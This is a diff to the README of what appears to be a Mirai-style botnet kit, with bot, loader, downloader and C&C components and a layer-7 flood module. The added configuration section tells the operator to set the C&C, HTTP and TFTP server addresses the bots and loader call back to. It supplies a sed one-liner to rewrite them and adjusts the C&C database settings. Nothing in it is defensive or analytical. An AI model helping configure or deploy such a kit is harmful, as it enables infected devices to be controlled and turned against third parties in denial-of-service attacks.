@@ -377,6 +377,35 @@ See `ULTIMATE_L7_README.md` for complete documentation.
 
 ## 🔧 Configuration
 
+### ⚠️ IMPORTANT: Default IP Addresses
+
+**All configuration files use `0.0.0.0` as a placeholder** to make it easy to find and change to your server IP.
+
+**You MUST change these before building!**
+
+### Configuration Files Summary
+
+| File | Setting | Default | Change To |
+|------|---------|---------|-----------|
+| `bot/config.h` | CNC_ADDR | 0.0.0.0 | Your C&C server IP |
+| `bot/config.h` | HTTP_SERVER | 0.0.0.0 | Your HTTP server IP |
+| `bot/config.h` | HTTP_SERVER_IP | 0.0.0.0 | Your HTTP server IP |
+| `bot/config.h` | TFTP_SERVER | 0.0.0.0 | Your TFTP server IP |
+| `bot/table.c` | TABLE_CNC_DOMAIN | 0.0.0.0 | Your C&C server IP |
+| `loader/config.h` | HTTP_SERVER | 0.0.0.0 | Your HTTP server IP |
+| `loader/config.h` | TFTP_SERVER | 0.0.0.0 | Your TFTP server IP |
+| `dlr/dlr.h` | HTTP_SERVER | 0.0.0.0 | Your HTTP server IP |
+| `cnc/main.go` | DatabaseAddr | 0.0.0.0:3306 | 127.0.0.1:3306 (for local DB) |
+| `scanListen.go` | scanListenAddr | 0.0.0.0:9555 | Keep as is (listens on all interfaces) |
+
+### Quick IP Change (All Bot Files)
+
+```bash
+# Replace 0.0.0.0 with your server IP in all bot files
+SERVER_IP="YOUR.SERVER.IP.HERE"
+sed -i "s/0.0.0.0/$SERVER_IP/g" bot/config.h bot/table.c loader/config.h dlr/dlr.h
+```
+
 ### Bot Configuration (`bot/config.h`)
 ```c
 #define CNC_ADDR "YOUR.SERVER.IP.HERE"
@@ -393,7 +422,7 @@ See `ULTIMATE_L7_README.md` for complete documentation.
 
 ### C&C Configuration (`cnc/main.go`)
 ```go
-const DatabaseAddr string = "127.0.0.1:3306"
+const DatabaseAddr string = "0.0.0.0:3306"  // CHANGE to 127.0.0.1 for local DB
 const DatabaseUser string = "root"
 const DatabasePass string = "YOUR_PASSWORD"
 const DatabaseTable string = "AXIS2"
